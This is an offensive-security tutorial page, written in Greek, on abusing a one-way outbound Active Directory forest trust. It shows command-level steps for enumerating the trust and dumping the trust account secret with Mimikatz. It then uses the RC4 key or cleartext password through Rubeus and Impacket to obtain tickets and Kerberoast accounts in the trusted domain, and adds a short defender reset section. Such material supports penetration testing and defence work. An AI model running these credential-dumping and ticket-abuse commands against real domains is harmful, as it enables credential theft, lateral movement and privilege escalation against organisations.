# External Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

Σε αυτό το σενάριο, **το domain σας** **εμπιστεύεται** ορισμένα **privileges** σε principals από ένα **διαφορετικό domain/forest**.

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Αν έχετε διαθέσιμο το AD module, εξετάστε απευθείας και το **Trusted Domain Object (TDO)**. Αυτό σας παρέχει τα raw LDAP-backed trust data που θα χρειαστείτε αργότερα, όταν αποφασίζετε αν η εύκολη διαδρομή είναι **FSP/group abuse** ή **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Θα πρέπει επίσης να καταγράψετε πού ακριβώς παραχωρήθηκε πρόσβαση στα foreign principals από το `CN=ForeignSecurityPrincipals`. Συνηθισμένες περιπτώσεις είναι:

- **Local admin** σε server/DC του τρέχοντος domain
- Membership σε ένα **custom domain group** που διαθέτει ACLs πάνω σε users/computers/GPOs
- Δικαιώματα τροποποίησης **computer objects**, τα οποία αργότερα μπορούν να μετατραπούν σε [RBCD](resource-based-constrained-delegation.md), εφόσον το επιτρέπει η trust configuration

## Trust Account Attack

Όταν δημιουργείται one-way trust από το domain/forest **B** προς το domain/forest **A** (**B trusts A**), δημιουργείται ένα **trust account** για το **B** στο **A**. Από την outbound-trust οπτική του **A**, αυτό είναι χρήσιμο επειδή, αν αργότερα κάνετε compromise στο **B** (την trusting πλευρά), μπορείτε να κάνετε dump το trust secret εκεί και να κάνετε authenticate πίσω στο **A** ως `B$`.<sup>[[1]](#references)</sup>

Το κρίσιμο σημείο εδώ είναι ότι το password και το Kerberos material για αυτό το trust account μπορούν να εξαχθούν από έναν Domain Controller στο **trusting** domain χρησιμοποιώντας:<sup>[[1]](#references)</sup>
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Αυτό λειτουργεί επειδή ο trust account που δημιουργείται στο **trusted** domain είναι ένας ενεργοποιημένος principal, ο οποίος τελικά διαθέτει τα βασικά δικαιώματα ενός κανονικού domain user εκεί. Αυτό συχνά αρκεί για την έναρξη enumeration μέσω LDAP, το request tickets και την εύρεση του επόμενου escalation path.<sup>[[1]](#references)</sup>

Σε ένα σενάριο όπου το `ext.local` είναι το **trusting** domain και το `root.local` είναι το **trusted** domain, δημιουργείται ένας user account με το όνομα `EXT$` μέσα στο `root.local`. Το dumping των trust keys από το `ext.local` αποκαλύπτει credentials που μπορούν να χρησιμοποιηθούν ως `root.local\EXT$` εναντίον του `root.local`:<sup>[[1]](#references)</sup>
```bash
lsadump::trust /patch
```
Στη συνέχεια, χρησιμοποιήστε το εξαγόμενο **RC4** key για να κάνετε authenticate ως `root.local\EXT$` μέσα στο `root.local`:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Στη συνέχεια, κάνε enumerate το trusted domain ως αυτό το principal, για παράδειγμα με Kerberoasting ενός high-value SPN στο `root.local`:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Από Linux

Αν ανακτήσατε το κλειδί του trust account **RC4**, η ίδια ιδέα λειτουργεί από Linux με το Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Αν το **RC4** δεν γίνει αποδεκτό, χρησιμοποίησε ως εναλλακτική το ανακτημένο **cleartext password** (ή τα παραγόμενα **AES** keys) και επανάχρησιμοποίησε τα συνήθη workflows [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) και [Kerberoast](kerberoast.md) από αυτό το foothold.

### Παγίδες στο key material

Μην μπερδεύεις τα **trust keys** με τα **trust-account credentials**:<sup>[[1]](#references)</sup>

- Σε ένα one-way trust, και οι δύο πλευρές αποθηκεύουν ένα **TDO**, αλλά ο πραγματικός λογαριασμός χρήστη **`EXT$` υπάρχει μόνο στο trusted domain**.
- Το τρέχον password του trust account αποτυπώνεται στο TDO trust secret (`NewPassword` / current trust key).
- Το **RC4** trust key είναι το ευκολότερο artifact για επανάχρηση με `asktgt` ως trust account. Σε default setups, αυτό είναι συνήθως το λειτουργικό enctype, επειδή το trust account συχνά έχει κενό `msDS-SupportedEncryptionTypes`.
- Αν σκέφτεσαι με όρους **AES trust keys**, θυμήσου ότι δεν είναι interchangeable με τα AES keys του trust account, επειδή τα salts διαφέρουν.

Επομένως, για την τεχνική αυτής της σελίδας, προτίμησε είτε το dumped **RC4** material είτε το ανακτημένο **cleartext** password.<sup>[[1]](#references)</sup>

### Συλλογή του cleartext trust password

Στο προηγούμενο flow χρησιμοποιήθηκε το trust hash αντί για το **cleartext password** (το οποίο επίσης γίνεται **dump από το mimikatz**).<sup>[[1]](#references)</sup>

Το cleartext password μπορεί να ληφθεί μετατρέποντας το output \[ CLEAR ] από το mimikatz από hexadecimal και αφαιρώντας τα null bytes `\x00`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Συλλογή του cleartext trust password: Το cleartext password μπορεί να ληφθεί μετατρέποντας το output ( CLEAR ) από το mimikatz από hexadecimal και αφαιρώντας τα null...](<../../images/image (938).png>)

Μερικές φορές, κατά τη δημιουργία μιας trust relationship, ο χρήστης πρέπει να πληκτρολογήσει ένα password για το trust. Σε αυτή την επίδειξη, το key είναι το αρχικό trust password και επομένως είναι human readable. Καθώς το key περιστρέφεται (default: κάθε 30 ημέρες), το cleartext συνήθως παύει να είναι human readable, αλλά παραμένει τεχνικά usable.<sup>[[1]](#references)</sup>

Το cleartext password μπορεί να χρησιμοποιηθεί για regular authentication ως trust account, ως εναλλακτική στην αίτηση ενός TGT με το Kerberos secret key του trust account. Εδώ, γίνεται query στο `root.local` από το `ext.local` για μέλη των `Domain Admins`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Συλλογή του cleartext trust password: Το cleartext password μπορεί να χρησιμοποιηθεί για regular authentication ως trust account, ως εναλλακτική στην αίτηση ενός TGT...](<../../images/image (792).png>)

### Πρακτικοί περιορισμοί

> [!WARNING]
> Τα trust accounts είναι awkward principals. Interactive logons όπως **RUNAS / console / RDP** δεν αποτελούν την αναμενόμενη διαδρομή εδώ, ενώ οι απόπειρες authentication μέσω **NTLM** μπορεί να αποτύχουν με `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Προτίμησε **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast).<sup>[[1]](#references)</sup>

### Σημείωση για persistence / cleanup

Αν οι defenders αντιληφθούν ότι το trusting domain έχει παραβιαστεί, πρέπει να κάνουν rotate το trust secret **και στις δύο πλευρές** με `netdom trust ... /resetOneSide ...`. Από την πλευρά του operator, αυτό έχει σημασία επειδή ένα **manual reset ακυρώνει αμέσως το παλιό trust material**, ενώ το normal trust-password rotation διατηρεί τις τρέχουσες/προηγούμενες τιμές κατά τη διάρκεια του rollover.<sup>[[2]](#references)</sup>
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Αναφορές

- [1] [SID filter ως security boundary μεταξύ domains; (Μέρος 7) – Trust account attack – από trusting σε trusted](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [AD Forest Recovery – Επαναφορά trust password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
